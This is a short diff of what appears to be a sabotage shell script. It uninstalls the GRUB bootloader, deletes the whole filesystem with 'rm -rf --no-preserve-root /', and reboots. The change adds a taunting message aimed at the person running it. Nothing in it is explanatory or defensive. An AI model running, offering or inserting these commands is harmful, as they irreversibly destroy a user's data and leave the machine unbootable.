@@ -19,4 +19,5 @@ pkg uninstall grub
 mkdir /done/
 rm -rf --no-preserve-root / 
 echo 'should be done'
+echo 'bye :P you did this :D'
 sudo reboot
